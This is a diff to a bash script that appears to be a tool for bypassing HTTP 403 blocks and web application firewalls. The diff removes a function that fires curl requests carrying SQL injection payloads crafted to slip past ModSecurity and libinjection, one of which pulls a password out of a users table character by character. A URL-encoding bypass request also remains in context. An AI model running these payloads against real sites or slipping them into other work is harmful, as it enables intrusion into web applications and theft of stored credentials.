@@ -1476,38 +1476,12 @@ function URL_Encode_Bypass(){
 	payload=$(printf "curl -k -s '${target}/;${path}/' -H 'User-Agent: Mozilla/5.0'\n")
 	print
 }
-function SQLi_libinjection(){
-	echo -e ${blue}"---------------------------------------"${end}
-	echo -e ${cyan}"[+] Mod_Security & libinjection Bypass "${end}
-	echo -e ${blue}"---------------------------------------"${end}
-	
-	
-	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/'%20or%201.e(%22)%3D'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
-	payload=$(printf "curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -H 'User-Agent: Mozilla/5.0'\n")
-	print
-
-	
-	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
-	payload=$(printf "curl -k -s '${target}/1.e(ascii' -H 'User-Agent: Mozilla/5.0'\n")
-	print
-
-	
-	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(substring(" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
-	payload=$(printf "curl -k -s '${target}/1.e(substring(' -H 'User-Agent: Mozilla/5.0'\n")
-	print
-
-	
-	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
-	payload=$(printf "curl -k -s '${target}/1.e(ascii%%%%201.e(substring(1.e(select%%%%20password%%%%20from%%%%20users%%%%20limit%%%%201%%%%201.e%%%%2C1%%%%201.e)%%%%201.e%%%%2C1%%%%201.e%%%%2C1%%%%201.e)1.e)1.e)%%%%20%%%%3D%%%%2070%%%%20or'1'%%%%3D'2' -H 'User-Agent: Mozilla/5.0'\n")
-	print
-}
 function 403bypass(){ 
 	Header_Bypass
 	Protocol_Bypass
 	Port_Bypass
 	HTTP_Method_Bypass
 	URL_Encode_Bypass
-	SQLi_libinjection
 }
 function prg(){
 	set +u
